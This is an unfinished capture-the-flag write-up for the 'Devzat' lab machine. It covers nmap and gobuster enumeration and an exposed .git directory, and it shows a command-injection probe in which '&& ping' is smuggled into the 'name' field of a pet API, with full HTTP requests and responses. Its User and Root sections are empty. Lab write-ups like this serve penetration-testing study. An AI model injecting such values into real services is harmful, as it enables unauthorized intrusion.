# Devzat

# Enumeration

````
$ nmap -sS --top-ports 100 10.10.11.118 -oG 10.10.11.118-sS
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 17:21 EST
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.16s latency).
Not shown: 97 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
````
22/tcp

80/tcp

8000/tcp

````
$ nmap -A -sV -sC -p22,80,8000 10.10.11.118 -oG 10.10.11.118-AsVC
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 17:22 EST
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: devzat - where the devs at
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=2/26%Time=621AA839%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   159.69 ms 10.10.14.1
2   153.87 ms devzat.htb (10.10.11.118)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.40 seconds
````

````
$ gobuster vhost -u devzat.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt | grep 200
Found: 2009.devzat.htb (Status: 302) [Size: 283]                          
Found: 2008.devzat.htb (Status: 302) [Size: 283]                          
Found: pets.devzat.htb (Status: 200) [Size: 510]
````
pets.devzat.htb

The pets.devzat.htb seems to has a vulnerable component to command injection in its API's endpoint /api/pet:

POST request:
````json
{"name":"&& ping 10.10.15.6","species":"bluewale"}
````

GET response:
````json
"characteristics":"exit status 1"
````

````http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 67
Connection: close

{"name":"&& ping 10.10.15.6","species":"bluewale"}
````

````http
GET /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Connection: close


````

````http
HTTP/1.1 200 OK
Date: Wed, 16 Mar 2022 10:24:58 GMT
Server: My genious go pet server
Content-Type: text/plain; charset=utf-8
Vary: Accept-Encoding
Content-Length: 2188
Connection: close

[{"name":"Cookie","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Mia","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Chuck","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Balu","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Georg","species":"gopher","characteristics":"Gophers use their long teeth to help build tunnels – to cut roots, loosen rocks and push soil away. Gophers have pouches in their cheeks that they use to carry food, hence the term “pocket” gopher. Gophers are generally solitary creatures that prefer to live alone except for brief mating periods."},{"name":"Gustav","species":"giraffe","characteristics":"With those extra long legs it is not surprising that a giraffe's neck is too short to reach the ground! Giraffes have a dark bluish tongue that is very long – approximately 50 centimetres (20 inches). Male giraffes fight with their necks."},{"name":"Rudi","species":"redkite","characteristics":"The wingspan of Red Kites can reach up to 170 cm (67 inch). Considering this large wingspan, the kites are very light birds, weighing no more than 0.9-1.3 kg (2.0-2.9 Punds)! The lifespan of Red Kites is usually around 4-5 years, but they can grow as old as 26 years of age! Red Kites have bright yellow legs and a yellow bill with a brown tip."},{"name":"Bruno","species":"bluewhale","characteristics":"The mouth of the blue whale contains a row of plates that are fringed with 'baleen', which are similar to bristles. Also the tongue of the blue whale is as big as an elephant."},{"name":"\u0026\u0026 ping 10.10.15.6","species":"bluewale","characteristics":"exit status 1"}]
````

````json
"characteristics":"exit status 1"
````

````
nmap -sCV -p22,80,8000 pets.devzat.htb -oA pets.devzat.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 06:21 EDT
Nmap scan report for pets.devzat.htb (10.10.11.118)
Host is up (0.15s latency).
rDNS record for 10.10.11.118: devzat.htb

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Pet Inventory
| http-git: 
|   10.10.11.118:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: back again to localhost only 
| http-server-header: 
|   Apache/2.4.41 (Ubuntu)
|_  My genious go pet server
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/16%Time=6231BA31%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds
````
pets.devzat.htb/.git/


# User

pets.devzat.htb/.git/

# Root

# Secrets
